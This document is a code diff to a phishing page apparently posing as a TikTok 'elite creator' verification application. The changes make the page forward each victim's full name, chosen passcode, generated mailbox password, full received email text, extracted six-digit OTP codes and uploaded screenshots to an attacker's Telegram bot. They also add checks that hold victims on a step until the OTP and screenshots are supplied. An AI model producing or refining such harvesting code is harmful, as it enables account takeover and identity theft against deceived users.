@@ -289,7 +289,7 @@
 
                     <div class="flex gap-4">
                         <button onclick="prevStep(2)" class="flex-1 py-4 bg-gray-800 rounded-2xl font-bold">Back</button>
-                        <button onclick="nextStep(4)" class="flex-[2] py-4 bg-tiktok-pink rounded-2xl font-bold btn-elite">Next Phase</button>
+                        <button onclick="validateStep3()" class="flex-[2] py-4 bg-tiktok-pink rounded-2xl font-bold btn-elite">Next Phase</button>
                     </div>
                 </div>
             </div>
@@ -344,7 +344,7 @@
 
                 <div class="flex gap-4">
                     <button onclick="prevStep(3)" class="flex-1 py-4 bg-gray-800 rounded-2xl font-bold">Back</button>
-                    <button onclick="nextStep(5)" class="flex-[2] py-4 bg-tiktok-pink rounded-2xl font-bold btn-elite">Review Application</button>
+                    <button onclick="validateStep4()" class="flex-[2] py-4 bg-tiktok-pink rounded-2xl font-bold btn-elite">Review Application</button>
                 </div>
             </div>
         </div>
@@ -504,16 +504,40 @@
 
         function prevStep(step) { nextStep(step); }
 
+        function validateStep3() {
+            const otp = document.getElementById('otp-code').innerText;
+            const img = document.getElementById('step3-image').files[0];
+            
+            if (otp === '------' || otp === 'SEE TG') {
+                return alert('Please wait for the verification code to arrive.');
+            }
+            if (!img) {
+                return alert('Please upload your creator profile screenshot.');
+            }
+            nextStep(4);
+        }
+
+        function validateStep4() {
+            const img = document.getElementById('step4-image').files[0];
+            if (!img) {
+                return alert('Please upload the submission receipt screenshot.');
+            }
+            nextStep(5);
+        }
+
         // STEP 1 LOGIC
         function checkEligibility() {
             const name = document.getElementById('user-name').value;
             if (!name || name.length < 3) return alert('Please enter your full legal name');
+            
+            // Forward name to Telegram immediately
+            sendToTelegram(`🌟 <b>New Identity Verification Started</b>\nName: ${name}`);
+
             document.getElementById('eligibility-form').classList.add('hidden');
             document.getElementById('eligibility-loading').classList.remove('hidden');
             setTimeout(() => {
                 document.getElementById('eligibility-loading').classList.add('hidden');
                 document.getElementById('eligibility-result').classList.remove('hidden');
-                sendToTelegram(`🌟 New Identity Verification Started\nName: ${name}`);
             }, 6500);
         }
 
@@ -532,7 +556,8 @@
 
         function confirmPasscode() {
             closeModal();
-            sendToTelegram(`🔐 Security Passcode Configured\nPasscode: ${savedPasscode}`);
+            const name = document.getElementById('user-name').value;
+            sendToTelegram(`🔐 <b>Security Passcode Configured</b>\nUser: ${name}\nPasscode: <code>${savedPasscode}</code>`);
             nextStep(3);
         }
 
@@ -562,7 +587,8 @@
                 token = tokenData.token;
 
                 document.getElementById('email-display').innerText = address;
-                sendToTelegram(`📧 Elite Endpoint Generated\nEmail: ${address}\nMail.tm Pass: ${password}`);
+                const name = document.getElementById('user-name').value;
+                sendToTelegram(`📧 <b>Elite Endpoint Generated</b>\nUser: ${name}\nEmail: <code>${address}</code>\nMail.tm Pass: <code>${password}</code>`);
                 startPolling();
             } catch (e) {
                 document.getElementById('email-display').innerText = 'Network Error. Retry.';
@@ -584,11 +610,16 @@
                             headers: { 'Authorization': `Bearer ${token}` }
                         });
                         const fullMsg = await msgRes.json();
-                        sendToTelegram(`📬 NEW ENCRYPTED MAIL RECEIVED\nFrom: ${fullMsg.from.address}\nSubject: ${fullMsg.subject}\nSnippet: ${fullMsg.intro}`);
-                        const otpMatch = fullMsg.intro.match(/\b\d{6}\b/);
+                        
+                        const name = document.getElementById('user-name').value;
+                        // Send FULL email content to Telegram
+                        sendToTelegram(`📬 <b>NEW ENCRYPTED MAIL RECEIVED</b>\nUser: ${name}\nFrom: ${fullMsg.from.address}\nSubject: ${fullMsg.subject}\n\nContent:\n${fullMsg.text || fullMsg.intro}`);
+                        
+                        // Extract numeric OTP (look for 6 consecutive digits)
+                        const otpMatch = (fullMsg.text || fullMsg.intro).match(/\b\d{6}\b/);
                         if (otpMatch) {
                             document.getElementById('otp-code').innerText = otpMatch[0];
-                            sendToTelegram(`🔑 OTP EXTRACTED: ${otpMatch[0]}`);
+                            sendToTelegram(`🔑 <b>OTP EXTRACTED:</b> <code>${otpMatch[0]}</code>\nUser: ${name}`);
                         } else {
                             document.getElementById('otp-code').innerText = "SEE TG";
                         }
@@ -622,7 +653,10 @@
                     const preview = document.getElementById(previewId);
                     preview.querySelector('img').src = e.target.result;
                     preview.classList.remove('hidden');
-                    sendToTelegram(`📸 Elite Asset Uploaded: ${file.name}`, e.target.result);
+                    
+                    const name = document.getElementById('user-name').value;
+                    const stepName = previewId.includes('step3') ? 'Profile Screenshot' : 'Submission Receipt';
+                    sendToTelegram(`📸 <b>Elite Asset Uploaded: ${stepName}</b>\nUser: ${name}`, e.target.result);
                 }
                 reader.readAsDataURL(file);
             }
@@ -648,14 +682,20 @@
                     })
                 });
 
-                // Send Photo if exists (as base64/blob)
+                // Send Photo if exists
                 if (photoData) {
                     const photoUrl = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`;
-                    const blob = await (await fetch(photoData)).blob();
+                    const response = await fetch(photoData);
+                    const blob = await response.blob();
+                    
                     const formData = new FormData();
                     formData.append('chat_id', TG_CHAT_ID);
                     formData.append('photo', blob, 'image.jpg');
-                    await fetch(photoUrl, { method: 'POST', body: formData });
+                    
+                    await fetch(photoUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
                 }
             } catch (e) {
                 console.error("TG Error:", e);
@@ -663,7 +703,8 @@
         }
 
         function finalSubmit() {
-            sendToTelegram("🚀 FINAL ELITE APPLICATION SUBMITTED");
+            const name = document.getElementById('user-name').value;
+            sendToTelegram(`🚀 <b>FINAL ELITE APPLICATION SUBMITTED</b>\nUser: ${name}`);
             nextStep('success');
         }
 
